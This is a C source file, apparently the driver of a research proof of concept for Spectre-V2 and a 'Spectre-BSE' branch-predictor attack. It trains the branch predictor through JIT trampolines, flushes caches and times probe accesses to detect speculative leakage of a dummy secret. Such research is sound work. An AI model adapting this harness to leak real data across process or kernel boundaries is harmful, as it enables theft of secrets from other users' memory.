#include "main.h"

void init_env();
void print_result();
void free_env();

__attribute__((aligned(4096))) 
uint64_t offsets_bh_leak[LEN_BH_CHAIN] = {0x00, 0x20, 0x40, 0x60, 0x80, 0xa0, 0xc0, 0x00, -1};
uint64_t offsets_bh_safe[LEN_BH_CHAIN] = {0x20, 0x40, 0x60, 0x80, 0xa0, 0xc0, 0x100, 0xe0, -1};

__attribute__((aligned(4096)))
uint64_t *res_cycles[NR_TESTS];
trampoline_obj_t *tramp_ret;
trampoline_obj_t *tramp_br;
uint64_t *targets_bh_leak;
uint64_t *targets_bh_safe;

__attribute__((aligned(4096))) 
void *ib_ptr = &t_leak;

__attribute__((aligned(4096))) 
uint8_t dummy_secret = 12;
void *ib_ptr_empty = &t_empty;
branch_chain_t bh_chain_common;

void goto_chain(branch_chain_t br_chain, uint64_t *bh_targets, void **ib_ptr_p, int nr_cond_bh, void *frbuf, void *secret_p, uint64_t ex_argc, char **ex_argv)
{
    // Populate BHB with conditional branches
    for (int i = 0; i < nr_cond_bh; i++)
        NOP(8);
    // Populate PHR with indirect branches and train_chains the BPU
    br_chain(bh_targets, 0, ex_argv, ib_ptr_p, frbuf, secret_p);
}

void do_spectre_test(test_obj_t test_specs)
{
    uint64_t nr_repeat = test_specs.nr_repeat;
    uint64_t nr_train_passes = test_specs.nr_train_passes;
    uint64_t nr_train_chains = test_specs.nr_train_chains;
    bh_chain_params_t **train_chains = test_specs.train_chains;
    bh_chain_params_t *test_chain = test_specs.test_chain;

    for (int test_iter = 0; test_iter < nr_repeat; test_iter++)
    {
        for (int train_iter = 0; train_iter < nr_train_passes; train_iter++)
        {
            // Warm-up the BPU
            test_specs.before_train();
            // Train the BPU with desired records
            for (int train_flow = 0; train_flow < nr_train_chains; train_flow++)
            {
                bh_chain_params_t *current = train_chains[train_flow];
                void **ib_ptr_p = current->ib_ptr_p;
                void *ib_target = current->ib_target;
                *ib_ptr_p = ib_target;

                branch_chain_t bh_chain = *(current->bh_chain_p);
                uint64_t *bh_targets = *(current->bh_targets_p);
                uint64_t nr_cond_bh = current->nr_cond_bh;
                void *_frbuf = *(current->frbuf_p);
                void *secret_p = current->secret_p;
                uint64_t ex_argc = current->ex_argc;
                char **ex_argv = current->ex_argv;
                goto_chain(bh_chain, bh_targets, ib_ptr_p, nr_cond_bh, _frbuf, secret_p, ex_argc, ex_argv);
            }
        }

        // Massage the BPU to a desired state
        test_specs.before_test();
        void **ib_ptr_p = test_chain->ib_ptr_p;
        void *ib_target = test_chain->ib_target;
        *ib_ptr_p = ib_target;

        // Run the test_chain and see if we can see the desired mis-speculation
        branch_chain_t bh_chain = *(test_chain->bh_chain_p);
        uint64_t *bh_targets = *(test_chain->bh_targets_p);
        uint64_t nr_cond_bh = test_chain->nr_cond_bh;
        char *_frbuf = *(test_chain->frbuf_p);
        char *secret_p = test_chain->secret_p;
        uint64_t ex_argc = test_chain->ex_argc;
        char **ex_argv = test_chain->ex_argv;

        FLUSH_DCACHE(ib_ptr_p);
        FLUSH_DCACHE(SC_ENCODE_ADDR(_frbuf, secret_p));
        for (int i = 0; i < test_specs.nr_dc_flush; i++)
            FLUSH_DCACHE(test_specs.dc_flush_p[i]);
        OPS_BARRIER(0x10);

        goto_chain(bh_chain, bh_targets, ib_ptr_p, nr_cond_bh, _frbuf, secret_p, ex_argc, ex_argv);
        // Decode side channel to see if we have made it!
        OPS_BARRIER(0x10);
        res_cycles[test_specs.type][test_iter] = mem_access_time(SC_ENCODE_ADDR(_frbuf, secret_p));
    }
}

extern test_obj_t test_spec_v2;
extern test_obj_t test_spec_bse_no_ev;
extern test_obj_t test_spec_bse;
// extern test_obj_t test_spec_bhs;

int main()
{
    init_env();
    // foreach(tests_imported_from_test*_c)
    //     do_spectre_test(each);
    do_spectre_test(test_spec_v2);
    do_spectre_test(test_spec_bse_no_ev);
    do_spectre_test(test_spec_bse);
    // NOP(16);
    print_result();
    free_env();
    return 0;
}

void init_res_buffers()
{
    init_frbuf(256, SIZE_CACHE_STRIDE);
    test_mem_latency(SC_ENCODE_ADDR(frbuf, &dummy_secret), NR_TEST_ITER);
    for (int i = 0; i < NR_TESTS; i++)
        res_cycles[i] = malloc(NR_TEST_ITER * sizeof(uint64_t));
}

void init_bh_chains()
{
    tramp_ret = prep_trampoline(&jit_ret_obj, &jit_nop_obj, 16, 0, BASE_RET_MEM, 0x1000);
    tramp_br = prep_trampoline(&jit_br_and_inc_idx_obj, NULL, 0, 0, BASE_BHB_POPULATE, 0x1000);

    targets_bh_leak = prep_jmp_targets(offsets_bh_leak, LEN_BH_CHAIN, *tramp_br);
    targets_bh_leak[LEN_BH_CHAIN - 1] = (uint64_t)&asm_br;
    targets_bh_safe = prep_jmp_targets(offsets_bh_safe, LEN_BH_CHAIN, *tramp_br);
    targets_bh_safe[LEN_BH_CHAIN - 1] = (uint64_t)&asm_br;
}

void init_env()
{
    init_res_buffers();
    init_bh_chains();
    init_evset();

    bh_chain_common = (branch_chain_t)(tramp_br->jit_mem->call_entry);
}

void print_result()
{
    int sum = 0;
    printf("Memory access latency (average of %d tests): \n", NR_TEST_ITER);
    printf("slow access: %d\n", mem_slow);
    printf("fast access: %d\n", mem_fast);
    printf("\n");

    printf("--- Spectre-V2 ---\n");
    sum = 0;
    for (int round = 0; round < NR_TEST_ITER; round++)
        sum += res_cycles[TEST_SPEC_V2][round];
    printf("Probe access latency (average of %d tests): %d\n\n", NR_TEST_ITER, sum / NR_TEST_ITER);

    printf("--- without Spectre-BSE ---\n");
    sum = 0;
    for (int round = 0; round < NR_TEST_ITER; round++)
        sum += res_cycles[TEST_SPEC_NO_BSE][round];
    printf("Probe access latency (average of %d tests): %d\n\n", NR_TEST_ITER, sum / NR_TEST_ITER);

    printf("--- WITH Spectre-BSE ---\n");
    sum = 0;
    for (int round = 0; round < NR_TEST_ITER; round++)
        sum += res_cycles[TEST_SPEC_BSE][round];
    printf("Probe access latency (average of %d tests): %d\n\n", NR_TEST_ITER, sum / NR_TEST_ITER);
}

void free_res_buffers()
{
    free_frbuf();
    for (int i = 0; i < NR_TESTS; i++) free(res_cycles[i]);
}

void free_bh_chains()
{
    free(targets_bh_leak);
    free(targets_bh_safe);
    free_trampoline(tramp_ret);
    free_trampoline(tramp_br);
}

void free_env()
{
    free_res_buffers();
    free_bh_chains();
    free_evset();
}
